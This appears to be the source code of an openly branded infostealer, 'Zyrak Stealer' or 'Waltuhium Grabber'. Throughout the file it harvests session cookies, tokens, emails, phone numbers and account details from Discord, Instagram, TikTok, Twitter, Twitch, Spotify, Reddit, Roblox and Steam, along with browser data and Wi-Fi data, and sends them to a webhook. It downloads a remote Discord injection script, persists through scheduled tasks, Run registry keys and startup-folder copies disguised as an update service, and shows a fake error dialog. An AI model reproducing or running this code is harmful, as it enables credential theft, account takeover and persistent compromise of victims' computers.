...
FakeError = (bool("%fake_error%"), ("System Error", "The program can't run, because needs io-driverswindows.dll.", 0))
...
class Main:
        ...
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                fields = [
                    ...
                    {"name": "<:mail:1095741024678191114> Email", "value": "``" + email + "``", "inline": True},
                    {"name": "<a:_:1256560042203942992> Region", "value": "``" +  region + "``", "inline": True},
                    {"name": "<a:_:1256560042203942992> Locale", "value": "``" + locale + "``", "inline": True},
                    {"name": "<a:_:1256560042203942992> Country", "value":"``" + country  + "``", "inline": True},
                    {"name": "<:_:1256993776564568237> MFA", "value": "``" + mfa + "``", "inline": True},
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            fields = [
                {"name": "<:_:1256629996169072670> Username", "value": "``" + username + "``", "inline": True},
                {"name": "<:_:1256996082303369305> Nick Name", "value": "``" + fullname + "``", "inline": True},
                {"name": "<:mail:1095741024678191114> Email", "value": "``" +  email + "``", "inline": True},
                {"name": "<a:_:1257044972079943733> Verified", "value": "``" + str(verify) + "``", "inline": True},
                {"name": "<a:_:1257045091483390054> Followers", "value":"``" + str(followers) + "``", "inline": True},
                {"name": "<:_:1256629996169072670> Following", "value": "``" + str(following) + "``", "inline": True},
                {"name": "<:_:1256996482100232292> Profile URL", "value": "``" + profileURL + "``", "inline": False},
                {"name": "<:_:1257045346123517966> Biography", "value": "``" + bio + "``", "inline": False},
                {"name": "<a:_:1257044690130436118> Cookie", "value": "``" + cookie + "``", "inline": False},]
            embed_data["fields"] = fields
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            fields = [
                {"name": "<:_:1256629996169072670> Username", "value": "``" + username + "``", "inline": True},
                {"name": "<:mail:1095741024678191114> Email", "value": "``" + email + "``", "inline": True},
                {"name": "<:phone:1095741029832990720> Phone", "value": "``" +  str(phone) + "``", "inline": True},
                {"name": "<:_:1256629996169072670> User identifier", "value": "``" + str(user_id) + "``", "inline": True},
                {"name": "<a:_:1257046220623577162> Coins", "value":"``" + str(coins) + "``", "inline": True},
                {"name": "<:_:1256996482100232292> Profile URL", "value": "``" + f'https://tiktok.com/@{username}' + "``", "inline": False},
                {"name": "<a:_:1257044690130436118> Tiktok Cookie", "value": "``" + cookie + "``", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            fields = [
                {"name": "<:_:1256629996169072670> Username", "value": "``" + username + "``", "inline": True},
                {"name": "<:_:1256629996169072670> Screen Name", "value": "``" + nickname + "``", "inline": True},
                {"name": "<a:_:1257045091483390054> Followers", "value": "``" +  str(req['followers_count']) + "``", "inline": True},
                {"name": "<:_:1256629996169072670> Following", "value": "``" + str(req['friends_count']) + "``", "inline": True},
                {"name": "<:_:1257046891842113587> Tweets", "value":"``" + str(req['statuses_count']) + "``", "inline": True},
                {"name": "<a:_:1257044972079943733> Verified", "value": "``" + str(req['verified']) + "``", "inline": True},
                {"name": "<:_:1256993776564568237> Created At", "value": "``" + str(req['created_at']) + "``", "inline": True},
                {"name": "<:_:1257045346123517966> Biography", "value": "``" + str(description) + "``", "inline": False},
                {"name": "<:_:1256996482100232292> Profile URL", "value": "``" + str(profileURL) + "``", "inline": False},
                {"name": "<a:_:1257044690130436118> Cookie", "value": "``" + str(cookie) + "``", "inline": False},
                ]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
            ...
            Variables.TwitterAccounts.append(f"<:_:1256629996169072670> Username : {username}\n<:_:1256629996169072670> Screen Name : {nickname}\n<a:_:1257045091483390054> Followers : {req['followers_count']}\n<:_:1256629996169072670> Following : {req['friends_count']}\n<:_:1257046891842113587> Tweets : {req['statuses_count']}\n<a:_:1257044972079943733> Verified : {req['verified']}\n<:_:1256993776564568237> Created At : {req['created_at']}\n<:_:1256996482100232292> Profile URL : {profileURL}\n<a:_:1257044690130436118> Cookie : {cookie}\n<:_:1257045346123517966> Biography : {description}\n=====================================================\n")
        except Exception as e:
            print(str(e))
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            lang = data["language"]
            pp = 'https://i.imgur.com/sq3bPxa.png'
            try:
            ...
            fields = [
                ...
                {"name": "<:_:1256629996169072670> Display Name", "value": "``" + str(displayName) + "``", "inline": True},
                {"name": "<:mail:1095741024678191114> Email", "value": "``" +  str(email) + "``", "inline": True},
                {"name": "<:_:1256996082303369305> ID", "value": "``" + str(id) + "``", "inline": True},
                {"name": "<:_:1257048347915849818> Prime", "value":"``" + str(hasPrime) + "``", "inline": True},
                {"name": "<:_:1257048523753652256> Partner", "value": "``" + str(isPartner) + "``", "inline": True},
                {"name": "<a:_:1256560042203942992> Language", "value": "``" + str(lang) + "``", "inline": True},
                {"name": "<a:_:1257048734861103224> Bit", "value": "``" + str(bits) + "``", "inline": True},
                {"name": "<:_:1256629996169072670> Followers", "value": "``" + str(followers) + "``", "inline": True},
                {"name": "<:_:1256996482100232292> Profile URL", "value": "``" + str(acc_url) + "``", "inline": False},
                {"name": "<a:_:1257044690130436118> Cookie", "value": "``" + str(auth_token) + "``", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            fields = [
                {"name": "<:mail:1095741024678191114> Email", "value": "``" + str(email) + "``", "inline": True},
                {"name": "<:mail:1095741024678191114> Username", "value": "``" + str(username) + "``", "inline": True},
                {"name": "<:_:1257049269085671434> Gender", "value": "``" +  str(gender) + "``", "inline": True},
                {"name": "<a:_:1257049382801506316> Birthdate", "value": "``" + str(birthdate) + "``", "inline": True},
                {"name": "<a:_:1256560042203942992> Country", "value":"``" + str(country) + "``", "inline": True},
                {"name": "<:_:1256996482100232292> Profile URL", "value": "``" + str(f'https://open.spotify.com/user/{username}') + "``", "inline": False},
                {"name": "<a:_:1257044690130436118> Spotify Cookie", "value": "``" + str(cookie) + "``", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            fields = [
                ...
                {"name": "<:mail:1095741024678191114> Email", "value": "``" + str(gmail) + "``", "inline": True},
                {"name": "<:_:1257050066271600722> Comment Karma", "value": "``" +  str(commentKarma) + "``", "inline": True},
                {"name": "<:_:1257050066271600722> Total Karma", "value": "``" + str(totalKarma) + "``", "inline": True},
                {"name": "<a:_:1257046220623577162> Coins", "value":"``" + str(coins) + "``", "inline": True},
                {"name": "<:_:1257050257179541588> Mod", "value": "``" + str(mod) + "``", "inline": True},
                {"name": "<:_:1257050367359717456> Gold", "value": "``" + str(gold) + "``", "inline": True},
                {"name": "<:_:1257050580480688210> Suspended", "value": "``" + str(suspended) + "``", "inline": True},
                {"name": "<:_:1256996482100232292> Profile URL", "value": "``" + str(profileUrl) + "``", "inline": False},
                {"name": "<a:_:1257044690130436118> Cookie", "value": "``" + str(cookie) + "``", "inline": False},
                ]
            embed_data["fields"] = fields
        ...
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                fields = [
                    ...
                    {"name": "<:mail:1095741024678191114> Email", "value": "``" +  str(email) + "``", "inline": True},
                    {"name": "<:_:1256996082303369305> ID", "value": "``" + str(id) + "``", "inline": True},
                    {"name": "<a:_:1257044972079943733> Email Verified", "value": "``" + str(isEmailVerified) + "``", "inline": True},
                    {"name": "<:_:1257051153321955419> Robux", "value": "``" + str(robux) + "``", "inline": True},
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                ...
                fields = [
                    {"name": "<:_:1256993776564568237> Token", "value": "``" + str(token) + "``", "inline": False},
                    {"name": "<:_:1256629996169072670> Username", "value": "``" + str(f'{data["username"]}#{data["discriminator"]}') + "``", "inline": True},
                    {"name": "<:mail:1095741024678191114> Email", "value": "``" + str(data['email']) + "``", "inline": True},
                    {"name": "<:_:1256629996169072670> ID", "value": "``" +  str(data["id"]) + "``", "inline": True},
                    {"name": "<:phone:1095741029832990720> Phone", "value": "``" + str(data['phone']) + "``", "inline": True},
                    {"name": "<:_:1256993776564568237> MFA", "value":"``" + str(data['mfa_enabled']) + "``", "inline": True},
                    {"name": "<:black_gift:1184971095003107451> Nitro Type", "value": "``" + str(nitroType) + "``", "inline": True},
                    {"name": "<:black_crown:1184938153291829288> Badges", "value": str(badges if badges != '' else 'None'), "inline": True},]
                if hq_friends:
                    try:
                        fields.append({"name": "<:friends:1111401676511924448> Hq Friends", "value":  hq_friends, "inline": False},)
                    except:
                        pass
                embed_data["fields"] = fields
                async with aiohttp.ClientSession() as session:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                fields = [
                                        ...
                                        {"name": "<:_:1256996082303369305> Realname", "value": "``" + str(realname) + "``", "inline": True},
                                        {"name": "<:_:1256993776564568237> ID", "value": "``" +  str(steamid) + "``", "inline": True},
                                        {"name": "<a:_:1256996292358439004> Timecreated", "value": "``" + str(timecreated) + "``", "inline": True},
                                        {"name": "<:_:1256996709830099067> Player Level", "value":"``" + str(player_level) + "``", "inline": True},
                                        {"name": "<:_:1256996482100232292> Profile URL", "value": "``" + str(profileurl) + "``", "inline": True},]
                                embed_data["fields"] = fields
                                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                    payload = {
                                        "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
    ...
    async def SendContains(self) -> None:
        try:
            ...
            fields = [
                ...
                {"name": "<:_:1256993776564568237> Autofills", "value": "```" +  str(autofill_keys) + "```", "inline": False},
                {"name": "<a:_:1257044690130436118> Cookies", "value": "```" + str(cookie_keys) + "```", "inline": False},]
            embed_data["fields"] = fields
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                payload = {
                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
    ...
    async def SendAllData(self) -> None:
        ...
        fields = [
             ...
             {"name": "<:_:1256996082303369305> Card", "value": "``" + str(len(Variables.Cards)) + "``", "inline": True},
             {"name": "<a:_:1257044690130436118> Cookie", "value": "``" +  str(len(Variables.Cookies) + len(self.FirefoxCookieList)) + "``", "inline": True},
             {"name": "<:_:1257057742405894234> History", "value": "``" + str(len(Variables.Historys) + len(self.FirefoxHistoryList)) + "``", "inline": True},
             {"name": "<:_:1257058035558518865> Download", "value":"``" + str(len(Variables.Downloads)) + "``", "inline": True},
             {"name": "<:_:1257058146749513780> Bookmark", "value": "``" + str(len(Variables.Bookmarks)) + "``", "inline": True},
             {"name": "<:_:1256993776564568237> Autofill", "value": "``" + str(len(Variables.Autofills) + len(self.FirefoxAutofiList)) + "``", "inline": True},
             {"name": "<:_:1256993776564568237> Tokens", "value": "``" + str(len(Variables.FullTokens)) + "``", "inline": True},
             {"name": "<:_:1257058479408156684> Instagram", "value": "``" + str(len(Variables.InstagramAccounts)) + "``", "inline": True},
             {"name": "<:_:1257058620613328947> Twitter", "value": "``" + str(len(Variables.TwitterAccounts)) + "``", "inline": True},
             {"name": "<:_:1257058780747796562> TikTok", "value": "``" + str(len(Variables.TikTokAccounts)) + "``", "inline": True},
             {"name": "<a:_:1257058884212887562> Twitch", "value": "``" + str(len(Variables.TwtichAccounts)) + "``", "inline": True},
             {"name": "<:_:1257058958439616624> Reddit", "value": "``" + str(len(Variables.RedditAccounts)) + "``", "inline": True},
             {"name": "<:_:1257059160629968906> Spotify", "value": "``" + str(len(Variables.SpotifyAccounts)) + "``", "inline": True},
             {"name": "<:_:1257059262878978070> Riot Game's", "value": "``" + str(len(Variables.RiotGameAccounts)) + "``", "inline": True},
             {"name": "<:_:1257059420269969420> Roblox", "value": "``" + str(len(Variables.RobloxAccounts)) + "``", "inline": True},
             {"name": "<:_:1257059490700988457> Steam", "value": "``" + str(len(Variables.SteamAccounts)) + "``", "inline": True},
             {"name": "<a:_:1257059625602252932> Wifi", "value": "``" + str(len(Variables.Wifis)) + "``", "inline": True},
             {"name": "<:_:1257059692794875955> FireFox?", "value": "``" + str(self.FireFox) + "``", "inline": True},]
        embed_data["fields"] = fields
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
            payload = {
                "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
...
class DiscordInjection:
    ...
    async def GetInjectionCode(self) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/hellowsecretcount/hellowdons/main/injection.js") as response:
                    data = await response.text()
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByZyrakStealer")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "ZyrakUpdateService", "Zyrak.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("Zyrak.exe", "")) # Create Directory
        ...
        try:
            ...
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "WaltuhiumUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "WaltuhiumUpdateService2" /tr "{self.ToPath}"'
                    ...
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        ...
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "WaltuhiumUpdateService" /tr "{self.ToPath}"'
                            ...
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "WaltuhiumUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
    ...
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Waltuhium Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Waltuhium Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Waltuhium.exe"):
                    print("")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Waltuhium.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Waltuhium.exe")):
                    print("")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Waltuhium.exe"))
        except Exception as e:
            print(str(e))
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "WaltuhiumUpdateService", "Waltuhium.exe"):
...
if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("Waltuhium | Grabber | on top |"):
